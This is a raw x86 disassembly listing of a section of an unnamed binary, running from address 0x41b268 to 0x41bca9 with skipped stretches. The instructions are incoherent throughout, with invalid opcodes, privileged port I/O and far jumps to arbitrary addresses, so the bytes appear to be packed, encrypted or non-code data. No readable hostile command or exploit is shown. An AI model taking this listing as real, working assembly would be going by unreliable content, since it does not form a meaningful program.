  41b268:	push   ebx
  41b269:	sub    eax,0x7e3017b7
	...
  41b2d6:	mov    fs,WORD PTR [ebp-0x13941f97]
  41b2dc:	(bad)  
  41b2dd:	out    dx,eax
  41b2de:	stos   BYTE PTR es:[edi],al
  41b2df:	jge    0x41b27c
  41b2e1:	or     ah,dh
  41b2e3:	mov    dh,0x52
  41b2e5:	repnz addr16 and al,0x1
  41b2e9:	add    BYTE PTR [eax],al
  41b2eb:	add    DWORD PTR [eax],eax
  41b2ed:	add    BYTE PTR [esi+eiz*4],bh
  41b2f0:	mov    cs,WORD PTR [ebx+edi*1]
  41b2f3:	mov    edi,0x47599839
  41b2f8:	retf   0xaef2
  41b2fb:	xor    edi,DWORD PTR [ebx-0x2a9dc6d]
  41b301:	int3   
  41b302:	xor    cl,BYTE PTR [esi-0x4b249edb]
  41b308:	sub    eax,0xb710e29e
  41b30d:	int3   
  41b30e:	in     eax,0xcc
  41b310:	div    DWORD PTR [edx]
  41b312:	dec    edx
  41b313:	or     eax,ecx
  41b315:	fs retf 
  41b317:	lahf   
  41b318:	inc    ebx
  41b31a:	push   es
  41b31b:	xor    bh,BYTE PTR [ebp+0x26]
  41b31e:	xor    esp,DWORD PTR [ecx+eiz*1-0x55]
  41b322:	push   es
  41b323:	jg     0x41b367
  41b325:	pop    ecx
  41b326:	or     dl,dl
  41b328:	dec    esp
  41b329:	ins    DWORD PTR es:[edi],dx
  41b32a:	xor    cl,BYTE PTR [edx+0x508ce313]
  41b330:	and    DWORD PTR [edi+0xab68de0],ecx
  41b336:	(bad)
  41b339:	ret    0x3d37
  41b33c:	mov    bl,0x65
  41b33e:	mov    dl,0xa6
  41b340:	cdq    
  41b341:	xchg   ecx,eax
  41b342:	fnstcw WORD PTR [esi-0x74]
  41b345:	call   0x967d:0x82a5a1ef
  41b34c:	pop    esp
  41b34d:	ja     0x41b37b
  41b34f:	mov    ah,0x85
  41b351:	mov    ebx,0x9d33bc71
  41b356:	add    bl,0xbc
  41b359:	sbb    cl,ah
  41b35b:	mov    cl,0x61
  41b35d:	fadd   QWORD PTR [ebx]
  41b35f:	or     ah,0x1c
  41b362:	inc    esi
  41b363:	sbb    al,0x86
  41b365:	in     al,0xf2
  41b367:	outs   dx,BYTE PTR ds:[esi]
  41b368:	stos   BYTE PTR es:[edi],al
  41b369:	sbb    bh,BYTE PTR [edx+ebp*1-0x5e]
  41b36d:	and    BYTE PTR [edx],dh
  41b36f:	push   ds
  41b370:	adc    eax,0xe78788aa
  41b375:	add    al,0xa7
  41b377:	lea    ecx,[ebx-0x22]
  41b37a:	sahf   
  41b37b:	mov    dh,0x2
  41b37d:	jmp    0xb703:0x597719ad
  41b384:	pop    es
  41b385:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b386:	mov    ecx,DWORD PTR [ecx+0x2fb90c4d]
  41b38c:	adc    al,0x61
  41b38e:	(bad)  
  41b38f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b390:	pop    ebp
  41b391:	rcl    DWORD PTR [ecx-0x39],cl
  41b394:	sub    ebp,ebx
  41b396:	das    
  41b397:	mov    ds:0x3ddf2645,eax
  41b39c:	cli    
  41b39d:	cmp    al,0xb1
  41b39f:	lahf   
  41b3a0:	or     cl,BYTE PTR [esi+0x2b]
  41b3a3:	mov    edi,es
  41b3a5:	mov    esi,DWORD PTR [edx]
  41b3a7:	mov    ds:0x547618d9,eax
  41b3ac:	popf   
  41b3ad:	mov    BYTE PTR [ebx],ch
  41b3af:	sar    esp,0x5e
  41b3b2:	cli    
  41b3b3:	fcmovne st,st(2)
  41b3b5:	into   
  41b3b6:	cdq    
  41b3b7:	ret    0x9a94
  41b3ba:	test   DWORD PTR [ebx-0x2],eax
  41b3bd:	adc    eax,0x18d99e6
  41b3c2:	aad    0x63
  41b3c4:	int    0x98
  41b3c6:	into   
  41b3c7:	call   0xfc5e54f0
  41b3cc:	out    dx,eax
  41b3cd:	retf   0x3ca0
  41b3d0:	lods   al,BYTE PTR ds:[esi]
  41b3d1:	test   DWORD PTR [edi-0x31],0x7443bee5
  41b3d8:	jmp    0x5111:0x4ef8d75c
  41b3df:	jbe    0x41b456
  41b3e1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b3e2:	ins    DWORD PTR es:[edi],dx
  41b3e3:	inc    ecx
  41b3e4:	fstp   DWORD PTR [ecx-0x53]
  41b3e7:	call   0x3024:0x4bee7b4a
	...
  41b456:	dec    eax
  41b457:	or     eax,0xbb5dab1d
  41b45c:	(bad)  
  41b45d:	out    dx,eax
  41b45e:	xchg   ebp,eax
  41b45f:	iret   
  41b460:	push   ebx
  41b461:	aas    
  41b462:	mov    ebp,0x67899f1e
  41b467:	and    eax,0x1000001
  41b46c:	add    BYTE PTR [eax],al
  41b46e:	cli    
  41b46f:	sub    ecx,DWORD PTR [eax*1-0x3d0489de]
  41b476:	leave  
  41b477:	ficom  WORD PTR [ebp-0x5f0518c7]
  41b47d:	into   
  41b47e:	out    dx,eax
  41b47f:	fstp   DWORD PTR [esp+edx*4]
  41b482:	rcl    dl,cl
  41b484:	data16 jnp 0x41b473
  41b487:	mov    ch,0x9e
  41b489:	push   0x454b60b
  41b48e:	ss add al,0xcb
  41b491:	pop    ecx
  41b492:	enter  0x9d1b,0x2a
  41b496:	fwait
  41b497:	rcl    BYTE PTR [eax],1
  41b499:	or     esi,esp
  41b49b:	mov    cl,0xe8
  41b49d:	and    DWORD PTR [edx-0x11],ebp
  41b4a0:	or     bh,BYTE PTR [ebx-0x7fe2bb87]
  41b4a6:	jmp    0xee6e1ad7
  41b4ab:	dec    esp
  41b4ac:	dec    edi
  41b4ad:	fdivr  DWORD PTR [esi-0x3a]
  41b4b0:	out    0x85,al
  41b4b2:	inc    edi
  41b4b3:	repnz pop edi
  41b4b5:	push   ds
  41b4b6:	jmp    0xd346:0x40d113d
  41b4bd:	scas   eax,DWORD PTR es:[edi]
  41b4be:	loop   0x41b4b2
  41b4c0:	aad    0xf5
  41b4c2:	mov    ebx,0xd73531fb
  41b4c7:	cmp    ebx,DWORD PTR [edi+0x1bdbd1b1]
  41b4cd:	scas   eax,DWORD PTR es:[edi]
  41b4ce:	dec    eax
  41b4cf:	inc    esi
  41b4d0:	rcr    BYTE PTR [ecx+0x7b],cl
  41b4d3:	add    BYTE PTR [ecx-0x7931e12b],cl
  41b4d9:	sbb    al,0xa
  41b4db:	mov    eax,ds:0xa336739f
  41b4e0:	test   ebp,ebx
  41b4e2:	inc    ebp
  41b4e3:	(bad)  
  41b4e4:	fidiv  WORD PTR [ebp+0x3e7b709c]
  41b4ea:	loope  0x41b547
  41b4ec:	jnp    0x41b514
  41b4ee:	mov    esi,0x851c9446
  41b4f3:	mov    bh,0x0
  41b4f5:	out    dx,eax
  41b4f6:	imul   edx,DWORD PTR [ebx+0x6bea66d1],0x72
  41b4fd:	cwde   
  41b4fe:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b4ff:	test   al,0xf8
  41b501:	pop    ebp
  41b502:	dec    ecx
  41b503:	xchg   edi,eax
  41b504:	mov    ebp,DWORD PTR [eax-0x5e0ee9bb]
  41b50a:	jle    0x41b49e
  41b50c:	sahf   
  41b50d:	aam    0xab
  41b50f:	fiadd  DWORD PTR ds:0x7936c7e2
  41b515:	test   al,0xdf
  41b517:	scas   al,BYTE PTR es:[edi]
  41b518:	nop
  41b519:	out    0x87,eax
  41b51b:	(bad)  
  41b51d:	push   ds
  41b51e:	fwait
  41b51f:	sbb    bl,BYTE PTR [eax]
  41b521:	daa    
  41b522:	sub    esi,DWORD PTR [esi+edx*8-0x694ae60f]
  41b529:	in     al,0x66
  41b52b:	in     eax,dx
  41b52c:	inc    ebx
  41b52d:	mov    cl,0x6c
  41b52f:	mov    dl,0x8b
  41b531:	pop    ss
  41b532:	mov    ds:0x54ace803,eax
  41b537:	mov    al,0x37
  41b539:	adc    BYTE PTR [eax],bl
  41b53b:	xor    eax,0xa0736f72
  41b540:	xchg   ebx,eax
  41b541:	mov    ds:0xdcfbc002,eax
  41b546:	push   esp
  41b547:	ins    DWORD PTR es:[edi],dx
  41b548:	xchg   ebp,eax
  41b549:	mov    esp,0x483544a9
  41b54e:	fbld   TBYTE PTR [ebx+0x1889599a]
  41b554:	pop    es
  41b555:	imul   eax,ebp,0x53
  41b558:	or     ebx,0xffffffa9
  41b55b:	xchg   edx,eax
  41b55c:	push   ebp
  41b55d:	mov    bh,0xc4
  41b55f:	adc    cl,bl
  41b561:	loope  0x41b53a
  41b563:	addr16 jo 0x41b5c7
  41b566:	stc    
  41b567:	jp     0x41b4f9
  41b569:	outs   dx,DWORD PTR ds:[esi]
  41b56a:	es inc edi
  41b56c:	xor    ah,ah
	...
  41b5d6:	aam    0xec
  41b5d8:	add    edi,edi
  41b5da:	cmp    edi,edi
  41b5dc:	(bad)  
  41b5dd:	out    dx,eax
  41b5de:	loope  0x41b5a6
  41b5e0:	jns    0x41b5c3
  41b5e2:	inc    ecx
  41b5e3:	dec    edx
  41b5e4:	jmp    0x0:0x12667b5
  41b5eb:	add    DWORD PTR [eax],eax
  41b5ed:	add    cl,ah
  41b5ef:	loop   0x41b5be
  41b5f1:	mov    al,0xe6
  41b5f3:	lahf   
  41b5f4:	inc    ebp
  41b5f5:	cmp    DWORD PTR [esi-0x58cb5613],edi
  41b5fb:	adc    eax,0x4c8381
  41b600:	and    DWORD PTR [eax],esp
  41b602:	add    al,0x3
  41b604:	sahf   
  41b605:	stos   DWORD PTR es:[edi],eax
  41b606:	xor    al,0x14
  41b608:	lods   eax,DWORD PTR ds:[esi]
  41b609:	push   ds
  41b60a:	and    BYTE PTR [ecx+0x6d],bl
  41b60d:	ret    0x33fb
  41b610:	cmp    BYTE PTR [edx],dh
  41b612:	call   0x59310c3c
  41b617:	inc    ecx
  41b618:	jo     0x41b608
  41b61a:	jmp    0xeed6326b
  41b61f:	inc    ecx
  41b620:	cmp    edi,DWORD PTR [esi+eax*8]
  41b623:	arpl   WORD PTR [esi-0x44],di
  41b626:	nop
  41b627:	cmp    BYTE PTR [edi],0x24
  41b62a:	push   esp
  41b62b:	sbb    DWORD PTR [ebp-0x2c35879b],0x4c
  41b632:	inc    esp
  41b633:	fidivr DWORD PTR [ecx-0x2584de9]
  41b639:	add    DWORD PTR [edi+edx*2],ebx
  41b63c:	push   0x14
  41b63e:	punpckhbw mm6,QWORD PTR [ebp+ecx*4+0x21c2c207]
  41b646:	cmp    eax,0xbfbffc5e
  41b64b:	push   DWORD PTR [eax]
  41b64d:	mov    eax,DWORD PTR [esp+eiz*2-0x4b]
  41b651:	imul   eax,DWORD PTR [esi+eax*1],0x6a
  41b655:	test   WORD PTR [eax+0x11],dx
  41b659:	inc    esp
  41b65a:	hlt    
  41b65b:	stos   BYTE PTR es:[edi],al
  41b65c:	repz (bad) 
  41b65e:	cmp    dh,al
  41b660:	test   BYTE PTR [ebp+ecx*8+0x701a987b],ah
  41b667:	stc    
  41b668:	shl    dl,cl
  41b66a:	inc    eax
  41b66b:	sbb    esp,ebx
  41b66d:	dec    ecx
  41b66e:	dec    edx
  41b66f:	push   edx
  41b670:	or     eax,DWORD PTR [esi-0xafce48d]
  41b676:	dec    ebp
  41b677:	test   al,0x69
  41b679:	retf   
  41b67a:	test   DWORD PTR [eax],eax
  41b67c:	adc    al,0x46
  41b67e:	xchg   edi,eax
  41b67f:	in     al,0x45
  41b681:	(bad)  
  41b682:	out    dx,al
  41b683:	push   eax
  41b684:	sub    edx,esi
  41b686:	mov    ds:0xc9ae5bcb,al
  41b68b:	ret    0x45d7
  41b68e:	popf   
  41b68f:	push   ebp
  41b690:	inc    edi
  41b691:	push   edx
  41b692:	hlt    
  41b693:	cmp    edx,ebp
  41b695:	push   edi
  41b696:	pop    ebx
  41b697:	mov    DWORD PTR [ecx-0x53],ebp
  41b69a:	add    eax,0xb44544a3
  41b69f:	mov    dl,0x2c
  41b6a1:	lock test eax,0x2e7fe2d1
  41b6a7:	faddp  st(7),st
  41b6a9:	dec    ecx
  41b6aa:	adc    al,0xb7
  41b6ac:	inc    eax
  41b6ad:	lods   al,BYTE PTR fs:[esi]
  41b6af:	jmp    0xc135fa75
  41b6b4:	ror    BYTE PTR [ebx],0xd3
  41b6b7:	rcr    DWORD PTR es:0x6943e4e3,cl
  41b6be:	pop    es
  41b6bf:	add    eax,0x3943e88d
  41b6c4:	fsub   QWORD PTR [ebp+0x1199e436]
  41b6ca:	mov    ds:0x46fa607f,eax
  41b6cf:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b6d0:	jne    0x41b745
  41b6d2:	cdq    
  41b6d3:	inc    edi
  41b6d4:	push   edx
  41b6d5:	int3   
  41b6d6:	mov    bl,0xb4
  41b6d8:	cdq    
  41b6d9:	mov    dl,0x69
  41b6db:	cwde   
  41b6dc:	lock ins BYTE PTR es:[edi],dx
  41b6de:	mov    esp,DWORD PTR [ecx-0x5016be49]
  41b6e4:	and    DWORD PTR [ebx-0x44],esi
  41b6e7:	sbb    BYTE PTR [esp+ebx*4+0x53],0xce
  41b6ec:	jle    0x41b687
	...
  41b756:	test   al,0x63
  41b758:	sbb    edx,DWORD PTR [esi+0x7fadfedb]
  41b75e:	sti    
  41b75f:	push   ds
  41b760:	mov    ah,dh
  41b762:	cmp    ecx,DWORD PTR [ecx]
  41b764:	push   ebp
  41b765:	mov    ds:0x12767,eax
  41b76a:	add    BYTE PTR [ecx],al
  41b76c:	add    BYTE PTR [eax],al
  41b76e:	test   al,0xf5
  41b770:	pop    ebp
  41b771:	mov    ah,0x20
  41b773:	push   ss
  41b774:	adc    eax,DWORD PTR [edi-0x41]
  41b777:	jmp    0xcd32987e
  41b77c:	mov    tr3,edx
  41b77f:	call   0xb32930c1
  41b784:	and    esi,DWORD PTR [edi+0x505ecb55]
  41b78a:	popf   
  41b78b:	push   0xa417a103
  41b790:	mov    esp,0x4d0f4054
  41b795:	or     edx,DWORD PTR [edx+0x3d]
  41b798:	mov    ecx,0xab399766
  41b79d:	cmp    ebp,DWORD PTR [edi]
  41b79f:	mov    ebx,0x9fc9e077
  41b7a4:	xchg   ecx,eax
  41b7a5:	bound  esp,QWORD PTR cs:[ecx-0x47888ea9]
  41b7ac:	je     0x41b81e
  41b7ae:	adc    esp,esp
  41b7b0:	push   eax
  41b7b1:	jle    0x41b797
  41b7b3:	or     eax,0xb9a74e6a
  41b7b8:	or     edi,DWORD PTR [ebx]
  41b7ba:	bound  ebx,QWORD PTR [edx]
  41b7bc:	call   esp
  41b7be:	cdq    
  41b7bf:	cmpps  xmm3,XMMWORD PTR [edi-0x34215e3a],0x46
  41b7c7:	in     al,dx
  41b7c8:	mov    dl,0x3e
  41b7ca:	enter  0x52e9,0x6a
  41b7ce:	pop    esp
  41b7cf:	sbb    BYTE PTR [ebx],al
  41b7d1:	inc    eax
  41b7d2:	adc    al,0x70
  41b7d4:	(bad)  
  41b7d5:	test   eax,0xd018926
  41b7da:	das    
  41b7db:	push   ds
  41b7dc:	sahf   
  41b7dd:	cld    
  41b7de:	in     eax,0x7b
  41b7e0:	push   ebx
  41b7e1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b7e2:	das    
  41b7e3:	jle    0x41b7ba
  41b7e5:	mov    edi,0x73e4fc9e
  41b7ea:	or     eax,DWORD PTR [eax+0x42be33e3]
  41b7f0:	cmp    edx,DWORD PTR [eax]
  41b7f2:	aam    0x8d
  41b7f4:	sti    
  41b7f5:	aas    
  41b7f6:	fsub   DWORD PTR [ebp-0x61]
  41b7f9:	(bad)  
  41b7fb:	jmp    0x5eff2ab3
  41b800:	xchg   edi,eax
  41b802:	ret    
  41b803:	je     0x41b78b
  41b805:	mov    al,ds:0x8e91bd1e
  41b80a:	sub    DWORD PTR [esi],ecx
  41b80c:	xor    BYTE PTR [edx],bh
  41b80e:	mul    DWORD PTR ds:0x413bddbe
  41b814:	test   BYTE PTR [ebp-0x477d7a51],dh
  41b81a:	shl    BYTE PTR [edx+0x2c73d051],0x37
  41b821:	and    dh,cl
  41b823:	inc    ecx
  41b824:	mov    DWORD PTR [edi],esp
  41b826:	mov    ds:0x78cb37ae,al
  41b82b:	xor    BYTE PTR [edx],cl
  41b82d:	in     eax,dx
  41b82e:	out    0x44,al
  41b830:	xlat   BYTE PTR ds:[ebx]
  41b831:	bound  edi,QWORD PTR [eax+0x10e9a6e7]
  41b837:	jbe    0x41b8ad
  41b839:	pop    edx
  41b83a:	cmc    
  41b83b:	push   eax
  41b83c:	mov    edi,0x63d08451
  41b841:	call   FWORD PTR [edi]
  41b843:	mov    ebx,0xdea0e693
  41b848:	dec    esp
  41b849:	inc    ecx
  41b84a:	or     al,0xf1
  41b84c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b84d:	xor    ch,BYTE PTR [ebp+edx*8+0x6]
  41b851:	out    dx,eax
  41b852:	test   edx,0x4464a852
  41b858:	adc    bh,ah
  41b85a:	xlat   BYTE PTR ds:[ebx]
  41b85b:	outs   dx,BYTE PTR ds:[esi]
  41b85c:	lods   eax,DWORD PTR ds:[esi]
  41b85d:	js     0x41b82b
  41b85f:	inc    ebp
  41b860:	test   al,0xf3
  41b862:	ret    0x3dc5
  41b865:	xchg   DWORD PTR [edi-0x2c],esp
  41b868:	sub    eax,0xbda4e46e
  41b86d:	add    al,0x0
	...
  41b8d3:	add    BYTE PTR [eax],al
  41b8d5:	add    BYTE PTR [edx-0x8b13804],cl
  41b8db:	jg     0x41b868
  41b8dd:	cld    
  41b8de:	ret    0x78e3
  41b8e1:	add    al,0x2f
  41b8e3:	and    eax,0x2867ca34
  41b8e8:	add    DWORD PTR [eax],eax
  41b8ea:	add    BYTE PTR [ecx],al
  41b8ec:	add    BYTE PTR [eax],al
  41b8ee:	xor    dh,bh
  41b8f0:	inc    ebx
  41b8f1:	popf   
  41b8f2:	mov    ecx,DWORD PTR [ecx-0x9]
  41b8f5:	jecxz  0x41b975
  41b8f7:	inc    esp
  41b8f8:	push   esi
  41b8f9:	les    edi,FWORD PTR [esp+esi*8+0x22]
  41b8fd:	(bad)  
  41b8fe:	dec    esp
  41b8ff:	je     0x41b89d
  41b901:	xor    cl,BYTE PTR [eax+0x38]
  41b904:	sub    ebp,ecx
  41b906:	mov    edi,0xe0787b4d
  41b90b:	sub    al,0x55
  41b90d:	inc    ebx
  41b90e:	les    esp,FWORD PTR [edx-0x57816f00]
  41b914:	sbb    al,BYTE PTR [eax-0x69]
  41b917:	inc    ebx
  41b918:	and    al,BYTE PTR [esi]
  41b91a:	xchg   ebp,eax
  41b91b:	sbb    eax,0x399be954
  41b920:	addr16 aas 
  41b922:	cmp    edx,DWORD PTR [edi-0xe]
  41b925:	mov    ds:0x97c3384d,al
  41b92a:	repz sub edx,DWORD PTR [edi-0x44fb1d4b]
  41b931:	les    ebx,FWORD PTR [edi+0x4a3587e]
  41b937:	(bad)  
  41b938:	test   al,0xb
  41b93a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b93b:	mov    al,ds:0x7efbdd7c
  41b940:	inc    di
  41b942:	jecxz  0x41b971
  41b944:	push   esi
  41b945:	es data16 das 
  41b948:	and    ecx,DWORD PTR [eax+0x2e]
  41b94b:	loope  0x41b8cd
  41b94d:	rcl    DWORD PTR ds:0x33a028e4,0x12
  41b954:	mov    bh,bl
  41b956:	mov    bh,0x4b
  41b958:	add    bl,ch
  41b95a:	in     eax,dx
  41b95b:	cmp    BYTE PTR [esi],dh
  41b95d:	inc    ebp
  41b95e:	sti    
  41b95f:	aam    0x5b
  41b961:	stos   BYTE PTR es:[edi],al
  41b962:	shl    DWORD PTR [esp+0x81ebbaa],0xe6
  41b96a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b96b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b96c:	call   0xed8f:0xdbc4b6b1
  41b973:	adc    bl,ah
  41b975:	outs   dx,DWORD PTR ds:[esi]
  41b976:	fs ret 0x26af
  41b97a:	jmp    0xb645d9ba
  41b97f:	sbb    dl,bh
  41b981:	mov    al,0x6d
  41b983:	adc    DWORD PTR [ebp+0x5540366f],edx
  41b989:	jl     0x41b946
  41b98b:	mov    esi,0x9f4b26a
  41b990:	or     BYTE PTR [eax+0x6355013d],al
  41b996:	push   ds
  41b997:	imul   esi,esi,0x23
  41b99a:	icebp  
  41b99b:	std    
  41b99c:	ja     0x41b977
  41b99e:	scas   al,BYTE PTR es:[edi]
  41b99f:	nop
  41b9a0:	jo     0x41b9d3
  41b9a2:	pushf  
  41b9a3:	cmc    
  41b9a4:	xchg   ebx,eax
  41b9a5:	xchg   DWORD PTR [esi],ebx
  41b9a7:	or     eax,0x11cd1acc
  41b9ac:	xchg   edi,ebp
  41b9ae:	test   al,0x66
  41b9b0:	das    
  41b9b1:	mov    bh,0xc8
  41b9b3:	jge    0x41b9fa
  41b9b5:	push   0x61
  41b9b7:	adc    BYTE PTR [edi+0xd39e4f8],0xff
  41b9be:	fist   WORD PTR [edx]
  41b9c0:	popa   
  41b9c1:	inc    esp
  41b9c2:	(bad)  
  41b9c3:	das    
  41b9c4:	mov    dl,0xe9
  41b9c6:	sar    DWORD PTR [ecx-0x16922fa4],0xd3
  41b9cd:	pushf  
  41b9ce:	aaa    
  41b9cf:	outs   dx,DWORD PTR ds:[esi]
  41b9d0:	and    DWORD PTR [bp+si],0x3878d4c0
  41b9d7:	call   DWORD PTR [esi+0x1a]
  41b9da:	mov    ebp,0x918f414a
  41b9df:	(bad)  
  41b9e0:	dec    ebx
  41b9e1:	pushf  
  41b9e2:	mov    eax,ds:0xbf1b895c
  41b9e7:	in     eax,0x67
  41b9e9:	add    al,0xab
  41b9eb:	mov    bh,BYTE PTR [ebx]
  41b9ed:	lds    eax,FWORD PTR [eax]
	...
  41ba53:	add    BYTE PTR [eax],al
  41ba55:	add    bl,al
  41ba57:	mov    esp,0xf87f4844
  41ba5c:	iret   
  41ba5d:	mov    edi,0x8c8b3b8c
  41ba62:	aam    0x2b
  41ba64:	imul   edx,esi,0x12967
  41ba6a:	add    BYTE PTR [ecx],al
  41ba6c:	add    BYTE PTR [eax],al
  41ba6e:	adc    eax,0x50c14968
  41ba73:	pop    esi
  41ba74:	sub    DWORD PTR [edx],edi
  41ba76:	mov    eax,ds:0xe45af90f
  41ba7b:	outs   dx,DWORD PTR ds:[esi]
  41ba7c:	(bad)  
  41ba7d:	adc    eax,0x98cdae2d
  41ba82:	xlat   BYTE PTR ds:[ebx]
  41ba83:	add    DWORD PTR [esi+0x27],edi
  41ba86:	test   DWORD PTR [esi+0x703dfd1],esp
  41ba8c:	test   DWORD PTR ds:0xac29660d,ebx
  41ba92:	jmp    0x2d84:0xfe98bc45
  41ba99:	mov    esp,0xe11bd8e1
  41ba9e:	cmp    DWORD PTR [esi-0x3f],ebx
  41baa1:	sbb    al,BYTE PTR [ebp-0x24]
  41baa4:	mov    ch,0x9a
  41baa6:	sub    eax,0x39dc84e0
  41baab:	pop    esp
  41baac:	pop    ebp
  41baad:	or     DWORD PTR [edx-0x6e421112],eax
  41bab3:	js     0x41bb09
  41bab5:	addr16 mov edi,0x29315935
  41babb:	lods   al,BYTE PTR ds:[esi]
  41babc:	das    
  41babd:	push   ss
  41babe:	sub    esp,0x18
  41bac1:	fstp   DWORD PTR [edx+0x66]
  41bac4:	sbb    DWORD PTR [ecx],ebp
  41bac6:	pop    esp
  41bac7:	push   edx
  41bac8:	rol    BYTE PTR [ebx],0x9c
  41bacb:	rcl    DWORD PTR [ebx],cl
  41bacd:	sbb    eax,0x7f8d5e76
  41bad2:	test   DWORD PTR [eax],esi
  41bad4:	pushf  
  41bad5:	fwait
  41bad6:	mov    ebx,0xab6885ae
  41badb:	mov    edi,0xe4f5b32e
  41bae0:	not    BYTE PTR [edi+0x76]
  41bae3:	shr    ebp,cl
  41bae5:	pop    eax
  41bae6:	dec    edx
  41bae7:	dec    ebx
  41bae8:	inc    DWORD PTR [ecx+eax*4]
  41baeb:	mov    BYTE PTR [ebp+0x2ddad70],cl
  41baf1:	push   cs
  41baf2:	int3   
  41baf3:	adc    BYTE PTR [edi],0xaa
  41baf6:	rol    DWORD PTR [esi-0x2d],0x80
  41bafa:	fld    QWORD PTR [esi+0x43fdec2f]
  41bb00:	cli    
  41bb01:	dec    ecx
  41bb02:	sub    DWORD PTR [ecx-0x4e],ecx
  41bb05:	sahf   
  41bb06:	jno    0x41ba91
  41bb08:	leave  
  41bb09:	call   0x7dbfaeed
  41bb0e:	jecxz  0x41bb5e
  41bb10:	pop    esi
  41bb11:	mov    ds:0xa96934dc,eax
  41bb16:	add    al,0xce
  41bb18:	mov    ebx,0x1ba2ab3b
  41bb1d:	mov    dh,0xff
  41bb1f:	dec    esi
  41bb20:	and    esi,DWORD PTR [esi]
  41bb22:	pop    ebp
  41bb23:	stc    
  41bb24:	test   al,0xc5
  41bb26:	and    bl,BYTE PTR es:[eax+eax*4-0x31c48360]
  41bb2e:	xchg   edi,eax
  41bb2f:	jno    0x5f0f09e3
  41bb35:	add    eax,0x8abf5f52
  41bb3a:	adc    eax,0x7d49e190
  41bb3f:	popa   
  41bb40:	lock cs xchg edi,ecx
  41bb44:	je     0x41bae1
  41bb46:	lods   eax,DWORD PTR ds:[esi]
  41bb47:	sbb    edx,edi
  41bb49:	mov    eax,ds:0x8e87664b
  41bb4e:	add    bh,BYTE PTR [ecx+0x1d]
  41bb51:	lods   eax,DWORD PTR ds:[esi]
  41bb52:	xor    cl,ah
  41bb54:	sar    dh,0x53
  41bb57:	push   cs
  41bb58:	fst    DWORD PTR [ebp+0x62]
  41bb5b:	outs   dx,DWORD PTR ds:[esi]
  41bb5c:	mov    esp,0x6d244428
  41bb61:	fld    TBYTE PTR ds:0x89a4d507
  41bb67:	jmp    0x41bb14
  41bb69:	in     al,0x85
  41bb6b:	repnz xchg ecx,eax
  41bb6d:	jge    0x41bb6f
	...
  41bbd3:	add    BYTE PTR [eax],al
  41bbd5:	add    BYTE PTR [edx],cl
  41bbd7:	mov    eax,0xbfb7aaa5
  41bbdc:	(bad)  
  41bbde:	jg     0x41bbe5
  41bbe0:	arpl   WORD PTR [edi+0x37],cx
  41bbe3:	sbb    DWORD PTR [edx],ecx
  41bbe5:	jge    0x41bc4e
  41bbe7:	sub    al,BYTE PTR [ecx]
  41bbe9:	add    BYTE PTR [eax],al
  41bbeb:	add    DWORD PTR [eax],eax
  41bbed:	add    BYTE PTR [esp+edx*8],dh
  41bbf0:	dec    ecx
  41bbf1:	xor    esp,DWORD PTR [ebx]
  41bbf3:	stc    
  41bbf4:	cs inc edi
  41bbf6:	xchg   esp,eax
  41bbf7:	mov    edi,0xbb3bb9d0
  41bbfc:	pop    ss
  41bbfd:	dec    esp
  41bbfe:	adc    al,0x77
  41bc00:	adc    eax,esi
  41bc02:	rcl    DWORD PTR [ecx-0x4d],cl
  41bc05:	or     BYTE PTR [esi-0x7756c090],ah
  41bc0b:	call   FWORD PTR ds:0xeb2663f0
  41bc11:	mov    ebx,0x6cbc48a5
  41bc16:	ja     0x41bc8d
  41bc18:	(bad)  
  41bc1a:	out    0x63,al
  41bc1c:	inc    ebp
  41bc1d:	(bad)  
  41bc1f:	dec    edx
  41bc20:	retf   
  41bc21:	test   DWORD PTR [eax-0xeaf1bf8],ecx
  41bc27:	push   0xa04bb80d
  41bc2c:	cwde   
  41bc2d:	ja     0x41bbf5
  41bc2f:	(bad)  
  41bc30:	xor    al,0x4f
  41bc32:	dec    ecx
  41bc33:	stos   DWORD PTR es:[edi],eax
  41bc34:	xor    BYTE PTR [edi],0x60
  41bc37:	xchg   edx,eax
  41bc38:	and    al,0x71
  41bc3a:	scas   al,BYTE PTR es:[edi]
  41bc3b:	jae    0x41bc35
  41bc3d:	test   DWORD PTR [edi-0x6e],ecx
  41bc40:	mov    WORD PTR [esi],gs
  41bc42:	imul   edi,DWORD PTR [edx+eiz*4],0x9
  41bc46:	jg     0x41bbd2
  41bc48:	xchg   edi,eax
  41bc49:	jmp    0x41bc2e
  41bc4b:	inc    ebp
  41bc4c:	ins    BYTE PTR es:[edi],dx
  41bc4d:	dec    esi
  41bc4e:	(bad)  
  41bc50:	and    al,0xfc
  41bc52:	inc    edx
  41bc53:	popf   
  41bc54:	fld    st(6)
  41bc56:	test   BYTE PTR [edx+0x49],cl
  41bc59:	jae    0x41bcac
  41bc5b:	das    
  41bc5c:	push   ds
  41bc5d:	stos   BYTE PTR es:[edi],al
  41bc5e:	mov    eax,0x7b9c5954
  41bc63:	(bad)  
  41bc64:	xchg   edi,eax
  41bc65:	mov    eax,0x9b977d0
  41bc6a:	fcom   st(0)
  41bc6c:	push   esi
  41bc6d:	das    
  41bc6e:	jmp    0x73e764e4
  41bc73:	lahf   
  41bc74:	call   0xb634:0x9d611a07
  41bc7b:	cdq    
  41bc7c:	jae    0x41bc2b
  41bc7e:	mov    bl,0x9d
  41bc80:	lods   eax,DWORD PTR ds:[esi]
  41bc81:	dec    esi
  41bc82:	jo     0x41bcf2
  41bc84:	(bad)  
  41bc85:	fisubr WORD PTR [esi+0x590f709c]
  41bc8b:	ror    DWORD PTR [ebp+0x7e],0xc7
  41bc8f:	dec    ebp
  41bc90:	sbb    al,0x30
  41bc92:	add    al,0x42
  41bc94:	add    ah,0x9e
  41bc97:	mov    esi,0x80a8d44f
  41bc9c:	iret   
  41bc9d:	outs   dx,BYTE PTR ds:[esi]
  41bc9e:	ret    
  41bc9f:	enter  0x1a59,0x3b
  41bca3:	iret   
  41bca4:	inc    eax
  41bca5:	add    al,0x6a
  41bca7:	add    al,dl
  41bca9:	cmp    ah,BYTE PTR [ecx]
